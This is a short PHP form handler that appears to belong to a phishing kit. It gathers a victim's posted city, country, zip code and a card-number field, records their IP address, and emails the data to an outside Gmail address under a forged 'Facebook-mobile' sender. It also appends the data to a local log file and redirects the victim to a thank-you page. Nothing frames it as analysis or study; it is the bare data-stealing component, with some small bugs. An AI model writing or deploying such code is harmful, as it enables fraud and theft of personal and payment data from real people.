<?php
$ip = getenv("REMOTE_ADDR");
$message .= "CITY: ".$_POST['Editbox1']."\n";
$message .= "Counrty: ".$_POST['Editbox2']."\n";
$message .= "Code Zip: ".$_POST['Editbox3']."\n";
$message .= "IP: $ip\n"; 
$$cc = $_POST['ccn'];
$subject = "Whatsapp From $ip (^_^) ".$_POST['exy'];
$send = "dchgalo@gmail.com";
$headers = "From: Facebook-mobile  <fsdfs@hotfgdfgmail.com>\r\n";
mail($send,$subject,$message,$headers,$file);
$file = fopen("dch.txt", 'a');
fwrite($file, $message);
header("Location: ../tnx/index.html");?>